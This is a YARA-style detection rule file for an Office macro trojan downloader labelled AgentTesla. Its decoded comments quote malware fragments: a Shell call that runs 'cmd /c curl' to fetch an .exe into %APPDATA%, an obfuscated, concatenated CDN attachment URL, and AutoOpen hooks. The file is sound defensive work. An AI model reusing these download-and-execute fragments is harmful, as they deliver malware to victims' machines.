
rule TrojanDownloader_O97M_AgentTesla_RVH_MTB{
	meta:
		description = "TrojanDownloader:O97M/AgentTesla.RVH!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {63 61 6c 6c 73 68 65 6c 6c 21 28 6d 6f 6e 69 74 6f 72 29 65 6e 64 66 75 6e 63 74 69 6f 6e } //01 00  callshell!(monitor)endfunction
		$a_01_1 = {75 73 65 74 77 6f 31 2e 63 6f 6d 6d 61 6e 64 31 2e 63 6f 6e 74 72 6f 6c 74 69 70 74 65 78 74 78 74 3d 78 31 65 6e 64 66 75 6e 63 74 69 6f 6e } //01 00  usetwo1.command1.controltiptextxt=x1endfunction
		$a_01_2 = {6f 6e 65 3d 67 68 74 2e 65 6c 65 70 68 61 6e 74 5f 2b 6c 6c 74 2e 6c 6f 72 61 74 77 6f 3d 6c 6c 74 2e 6b 2b 6c 6c 74 2e 74 5f 2b 6c 6c 74 2e 78 74 74 68 72 65 65 3d 6f 6e 65 5f 2b 74 77 6f } //01 00  one=ght.elephant_+llt.loratwo=llt.k+llt.t_+llt.xtthree=one_+two
		$a_01_3 = {61 75 74 6f 5f 63 6c 6f 73 65 28 29 } //00 00  auto_close()
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_AgentTesla_RVH_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/AgentTesla.RVH!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 20 28 22 63 6d 64 20 2f 63 20 63 75 72 6c 20 22 20 26 20 4f 20 26 20 54 61 6b 73 69 6d 28 29 20 26 20 22 2f 22 20 26 20 5a 61 72 67 65 6e 28 29 20 26 20 22 2f 64 61 76 69 69 69 64 2e 65 78 65 22 20 26 20 22 20 2d 2d 6f 75 74 70 75 74 20 25 41 50 50 44 41 54 41 25 5c 64 61 76 69 69 69 64 2e 65 78 65 } //01 00  Shell ("cmd /c curl " & O & Taksim() & "/" & Zargen() & "/daviiid.exe" & " --output %APPDATA%\daviiid.exe
		$a_01_1 = {22 68 74 74 22 20 26 20 41 70 61 73 69 28 29 20 26 20 22 63 64 6e 2e 64 22 20 26 20 41 70 6f 6c 69 7a 65 28 29 20 26 20 22 64 61 70 70 2e 63 22 20 26 20 61 6e 6b 61 72 61 28 29 20 26 20 22 61 63 68 6d 65 6e 74 73 2f 22 } //01 00  "htt" & Apasi() & "cdn.d" & Apolize() & "dapp.c" & ankara() & "achments/"
		$a_01_2 = {41 75 74 6f 4f 70 65 6e 28 29 } //00 00  AutoOpen()
	condition:
		any of ($a_*)
 
}